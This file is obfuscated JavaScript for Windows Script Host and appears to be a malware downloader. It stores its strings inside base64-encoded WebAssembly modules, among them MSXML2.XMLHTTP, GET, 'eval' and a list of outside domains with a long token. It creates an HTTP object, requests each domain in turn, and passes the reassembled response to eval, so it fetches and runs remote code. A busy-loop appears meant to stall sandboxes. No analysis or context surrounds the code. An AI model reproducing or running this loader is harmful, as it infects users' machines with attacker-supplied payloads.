const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGroGAgAAffwBBAQt/AEESC38AQRgLfwBBGgt/AEEeC38AQSALfwBBJgt/AEEsC38AQTALfwBBMgt/AEE2C38AQTgLfwBBPAt/AEHAAAt/AEHCAAt/AEHKAAt/AEHMAAt/AEHSAAt/AEHkAAt/AEH4AAt/AEGSAQt/AEGiAQt/AEHIAQt/AEHCAgt/AEHMAgt/AEHOAgt/AEHUAgt/AEHaAgt/AEHgAgt/AEHmAgt/AEHqAgsHl4KAgAAgBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxUGZGF0YTIyAxYGZGF0YTIzAxcGZGF0YTI0AxgGZGF0YTI1AxkGZGF0YTI2AxoGZGF0YTI3AxsGZGF0YTI4AxwGZGF0YTI5Ax0GZGF0YTMwAx4L7YOAgAAfAEEBCw9NU1hNTDIuWE1MSFRUUAAAQRILBCUyRgAAQRgLAQAAQRoLAnQAAEEeCwEAAEEgCwVaUkFNAABBJgsEJTNBAABBLAsCcAAAQTALAQAAQTILAlMAAEE2CwEAAEE4CwJhAABBPAsCVAAAQcAACwEAAEHCAAsGUElMS1UAAEHKAAsBAABBzAALBUdFVEEAAEHSAAsQYWRpc2dvbGRneW0uY29tAABB5AALE2Jvb2thZnl0cmFpbmVyLmNvbQAAQfgACxlkZXNrNC4xMjN3ZWJkZXNpZ25tZS5jb20AAEGSAQsObWFsLWF1LWRvcy5mcgAAQaIBCyVyZWZvcm0uZ3JlbmFkYWNvbnN0aXR1dGlvbnJlZm9ybS5jb20AAEHIAQt4MDAwMDAwMUZBamtNNTE3aFRZUUJoV3pIdERQZWFEVUtTY1JSa0VwQVRXc0U5cEZRaGw5dVhjMkViYk43R2JpNDU1YnR4RXlFd1l6MnE0NFFlelc1ZlBuNElhY1BCY19YdFpaV3UzQjhfak5tTnNXOEdlVTlidzAAAEHCAgsIY291bnRlcgAAQcwCCwEAAEHOAgsFaHR0cAAAQdQCCwQlM0EAAEHaAgsEJTJGAABB4AILBCUzRgAAQeYCCwJhAABB6gILBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var uuu = 0;
(() => {
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return uuu < 999999 ? 1 : 0;
            },
            update: () => {
            },
            body: () => {
                {
                    uuu++;
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
var ijdl = lS(0, 0);
var dfs = WScript.CreateObject(ijdl);
var pusik = [
    lS(0, 1) + lS(0, 2),
    lS(0, 3) + lS(0, 4),
    lS(0, 5),
    lS(0, 6),
    lS(0, 7),
    lS(0, 8),
    lS(0, 9) + lS(0, 10),
    lS(0, 11),
    lS(0, 12),
    lS(0, 13),
    lS(0, 14)
];
function ataaa(ziyter) {
    window[lS(0, 30, true)](ziyter + lS(0, 15));
}
pusik[1 + 1] = lS(0, 16);
pusik[2] = pusik[2].substr(0, 3);
var x = [
    lS(0, 17),
    lS(0, 18),
    lS(0, 19),
    lS(0, 20),
    lS(0, 21)
];
var gyt = 0;
var lub = pusik[0];
function muhter(kjg, lki) {
    return kjg.split(lki);
}
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var feni = lS(0, 22);
        var ghyt = false;
        var tjkh = x[gyt + 0 + 0];
        var nami = lS(0, 23);
        (() => {
            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        grohot(dfs, pusik[1 + 1] + lS(0, 24), lS(0, 25) + lS(0, 26) + lub + lub + tjkh + lS(0, 27) + nami + lS(0, 28) + feni, ghyt);
                    }
                }
            });
            const __exports = __callInstance3.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        dfs.send();
                    }
                }
            });
            const __exports = __callInstance2.exports;
            return __exports.data();
        })();
        var r = dfs.responseText;
        var rima = 10 * 50;
        var got = 50 + 450 + rima;
        var fontu = r.length;
        var emisogh = 12;
        if (fontu - got * 2 > emisogh + emisogh - (22 + 2) - got && r.indexOf(feni) > got + 1 - 1002) {
            var jiki = muhter(r, feni);
            var guznam = fuuu(jiki, lS(0, 29)) + pusik[9];
            (() => {
                const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                    env: {
                        impFunc: () => {
                            ataaa(guznam);
                        }
                    }
                });
                const __exports = __callInstance1.exports;
                return __exports.data();
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;
function fuuu(fuu1, fuu2) {
    return fuu1.join(fuu2);
}
function grohot(hunko, b1, b2, b3) {
    (() => {
        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
            env: {
                impFunc: () => {
                    hunko.open(b1, b2, b3);
                }
            }
        });
        const __exports = __callInstance0.exports;
        return __exports.data();
    })();
}